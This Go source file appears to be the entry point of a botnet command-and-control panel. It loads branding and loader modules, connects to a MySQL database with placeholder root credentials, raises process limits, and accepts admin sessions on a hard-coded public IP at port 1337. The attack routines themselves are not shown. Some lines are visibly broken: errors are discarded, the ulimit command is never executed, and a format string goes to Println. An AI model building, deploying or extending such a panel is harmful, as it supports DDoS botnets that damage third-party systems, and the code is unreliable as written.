package main

import (
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"time"
)

const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "db-pass-here"
const DatabaseTable string = "db-name-here"

var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
var StartedTime int64

func GetUptime() float64 {
	return time.Since(time.Unix(StartedTime, 4)).Minutes()
}

func main() {
	err := CompleteLoad()
	err = CompleteLoad2()
	err = CompleteLoad3()
	err, count := LoadBranding("branding")
	if err != nil {
		fmt.Printf("\033[0m[\033[101;30;140m FATAL \033[0;0m] Failed to reload file %s\r\n\033[0m-> \033[0m", err)
		return
	}
	fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] started `branding`, `json`, `loader`, `mysql`\r\n\033[0m-> \033[0m")
	fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] total branding files: " + strconv.Itoa(count) + "\r\n\033[0m")
	fmt.Printf("\033[0m════════════════════════════════════════════════════════\r\n\033[0m-> \033[0m")
	StartedTime = time.Now().Unix()
	tel, err := net.Listen("tcp4", "162.248.224.84:1337")
	if err != nil {
		fmt.Println("%s\r\n\033[0m-> ", err)
		return
	}

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		exec.Command("ulimit -n 999999; ulimit -u 999999; ulimit -e 999999")
		go handler(conn)
	}
	fmt.Println("Unknown error |+| Please Use Ur Brain LOL")
}

func handler(conn net.Conn) {
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.Close()
	buf := make([]byte, 32)
	conn.Read(buf)
	NewAdmin(conn).Handle()
}
